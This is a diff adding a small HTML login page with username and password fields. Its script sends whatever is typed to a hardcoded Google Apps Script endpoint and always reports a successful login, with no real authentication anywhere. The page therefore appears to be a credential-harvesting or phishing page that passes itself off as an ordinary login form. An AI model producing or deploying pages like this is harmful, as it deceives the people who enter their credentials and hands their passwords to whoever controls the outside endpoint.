@@ -1,0 +1,26 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Login</title>
+</head>
+<body>
+  <form id="contact-form">
+    <input type="text" name="username" placeholder="username:" required><br>
+    <input type="password" name="password" placeholder="password:" required><br>
+    <button type="submit">Login</button>
+  </form>
+
+  <script>
+    const form = document.getElementById('contact-form');
+    form.addEventListener('submit', e => {
+      e.preventDefault();
+      fetch('https://script.google.com/macros/s/AKfycbxD0QVVAiRy_EO4IWtL0PAxtuyf_McJGA1BnWz27A4hvAF60p0TxgD6syJFHE4am3zS/exec', {
+        method: 'POST',
+        body: new FormData(form)
+      })
+      .then(response => alert('Login successfully!'))
+      .catch(error => alert('Error logging in.'));
+    });
+  </script>
+</body>
+</html>
